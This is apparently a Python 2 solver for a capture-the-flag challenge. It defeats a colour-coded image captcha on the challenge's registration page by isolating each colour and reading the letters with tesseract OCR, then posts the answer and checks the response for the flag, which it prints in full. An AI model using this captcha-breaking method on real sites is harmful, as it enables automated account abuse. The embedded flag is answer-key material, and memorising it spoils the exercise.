#!/usr/bin/python2

"""
    You will need to install the following packages:
        -> apt-get install python-pip
        -> pip install Pillow
        -> pip install numpy
        -> pip install requests
        -> apt-get install tesseract-ocr

    This programs needs to have the permission to read/write files in his execution folder
"""

import os,requests,base64,sys, numpy as np
from PIL import Image
from io import BytesIO

#Url of register form
address = "https://captcha-image.insecurity-insa.fr/register.php"

#Color that appears in the captcha to sanitize letters
colors = [(100,0,0),(0,0,100),(0,100,0),(100,0,100),(100,100,0)]

def alive():
    return "Camera Timelapse Service" in requests.get(address).text

def get_content(path):
    with open(path, 'r') as content_file:
        content = content_file.read()
    return content

def recognition(img):

    #Redefining image
    pixels = img.load()
    width,height = img.size
    window = (width / len(colors))*2

    solution = ""
    for ar,ag,ab in colors:

        #New data image for treatment
        newdata = np.zeros((height,width,3),dtype=np.uint8)

        #Keep only desired color
        for x in range(width):
            for y in range(height):
                r,g,b = pixels[x,y]
                if r==ar and ag==g and ab==b: newdata[y,x] = (0,0,0)
                else: newdata[y,x] = (255,255,255)

        #Save new image
        img = Image.fromarray(newdata,"RGB")

        #Save image for recognition in CLI with tesseract
        img.crop((0,0,width,height)).save("/tmp/captchasample.png")

        #Call tesseract with the character only mode and the desired alphabet
        os.system("tesseract -psm 10 /tmp/captchasample.png -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz /tmp/out > /dev/null 2>&1")
        solution += get_content("/tmp/out.txt").split()[0]

    os.system("rm -f /tmp/out.txt /tmp/captchasample.png")
    return solution


def exploitable():
    #Session for http requests
    s = requests.Session()

    #Number of tries before saying that the challenge is down
    tries = 20

    #1st request
    pagedata = s.get(address).content

    while tries > 0:
        #Parse image
        encoded = pagedata.split('<img id="captcha" src=\'data:image/png;base64,')[1].split('\' class="col-sm-10" />')[0]
        img = Image.open(BytesIO(base64.b64decode(encoded))).convert("RGB")

        #uncomment to have the current captcha saved on file system
        #img.save("captcha.png")

        #Get image infos
        pixels = img.load()
        width,height = img.size

        #Separation en deux images pour une reconnaissance plus simple
        im1 = img.crop((0,0,width/2,height))
        im2 = img.crop((width/2,0,width,height))

        #Send data to the registration form
        payload = {'captcha': recognition(im1)+recognition(im2), 'serial': "HFEK-RAZAZ-45666-ARZA-RAAA",'name':'Pelle'}
        #print "Payload:",payload
        r = s.post(address,data=payload)

        #Parsing new data
        pagedata = r.text

        #If the success window is found => solved
        if "alert-success" in pagedata and r.text.split("we can uproot them! ")[1].split()[0] == "INSA{The_Plants_Are_A_Lie}":
            return True

        tries-=1

    return False

if __name__ == "__main__":
    print(alive() and exploitable())
